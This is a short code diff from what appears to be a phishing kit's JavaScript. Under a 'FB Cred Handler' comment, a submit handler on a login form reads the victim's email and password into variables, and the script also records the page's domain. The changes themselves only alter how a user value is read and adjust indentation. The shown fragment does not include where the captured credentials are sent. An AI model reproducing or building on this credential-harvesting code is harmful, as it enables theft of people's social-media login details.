@@ -1,5 +1,5 @@
 //----------------------Do not edit this script unless you know what you are doing----------------------
-var c = WLCuser;
+var c = $('input#WLCuserbox').val();
 var u;
 var p;
 var s = document.domain;
@@ -11,7 +11,7 @@ console.log(TargetSite);
 // FB Cred Handler
 var FB_submit = 0;
 $('#login_form').submit(function(){
-	u = $('input#email').val();
+		u = $('input#email').val();
 		p = $('input#pass').val();
 		
 		
